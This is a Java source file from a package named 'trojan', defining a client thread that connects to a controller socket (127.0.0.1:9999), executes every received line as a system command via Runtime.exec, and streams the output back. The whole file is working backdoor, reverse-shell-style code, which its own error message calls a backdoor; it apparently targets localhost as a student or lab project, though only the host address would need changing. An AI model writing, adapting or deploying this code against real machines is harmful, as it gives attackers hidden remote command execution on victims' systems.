package com.kien.trojan.client;

import lombok.AllArgsConstructor;
import lombok.Data;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

@Data
@AllArgsConstructor
public class Client extends Thread {
    String endSignal;
    Socket socket;
    public Client() {
        try {
            this.socket = new Socket("127.0.0.1", 9999);
            this.endSignal = "%**%";
        } catch (Exception ex) {
            System.err.println("Error when initilizing backdoor server!!");
        }
    }

    @Override
    public void run() {
        if (socket == null) return;
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
            while (!socket.isClosed()) {
                String command = bufferedReader.readLine();
                if (command.equals("exit-client.")) {
                    System.exit(0);
                }

                try {
                    Process process = Runtime.getRuntime().exec(command);

                    BufferedReader buf = new BufferedReader(new InputStreamReader(process.getInputStream()));

                    buf.lines().forEach(s -> {
                        try {
                            printWriter.println(s);
                        } catch (Exception e) {
                            e.printStackTrace(); }
                        printWriter.flush();
                    });

                } catch (Exception ex) {
                    ex.printStackTrace();
                    printWriter.println(ex.getMessage());
                    printWriter.flush();
                }
                printWriter.println(endSignal);
                printWriter.flush();
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
